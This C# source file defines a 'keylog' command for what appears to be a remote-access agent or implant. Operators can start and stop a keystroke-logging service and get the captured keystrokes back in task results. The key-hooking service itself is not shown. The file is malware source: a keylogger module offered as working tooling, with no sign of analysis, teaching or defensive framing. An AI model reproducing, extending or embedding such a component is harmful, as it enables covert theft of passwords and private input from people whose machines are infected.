using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Windows.Input;
using System.Runtime.InteropServices;
using System.IO;
using System.Threading;
using Agent.Models;
using System.Diagnostics;
using Agent.Service;
using Agent.Commands.Services;

namespace Agent.Commands
{
    public class KeyLoggerCommand : ServiceCommand<IKeyLogService>
    {
        public override string Name => "keylog";

        protected override void Start(AgentTask task, AgentCommandContext context, string[] args)
        {
            if (this.Service.Status == RunningService.RunningStatus.Running)
            {
                context.Result.Result = "Key Logger is already running!";
                return;
            }

            this.Service.Start();
            context.Result.Result = $"Key Logger started";
        }

        protected override void Stop(AgentTask task, AgentCommandContext context, string[] args)
        {
            if (this.Service.Status != RunningService.RunningStatus.Running)
            {
                context.Result.Result = "Key Logger is not running!";
                return;
            }

            this.Service.Stop();
            context.Result.Result = $"Key Logger stoped : " + Environment.NewLine;
            context.Result.Result += this.Service.LoggedKeyStrokes;
        }

        protected override void Show(AgentTask task, AgentCommandContext context, string[] args)
        {
            if (this.Service.Status == RunningService.RunningStatus.Running)
            {
                context.Result.Result = "Key Logger is running!";
                context.Result.Result += this.Service.LoggedKeyStrokes;
            }
            else
                context.Result.Result = "Key Logger is stopped!";
            return;
        }
    }
}
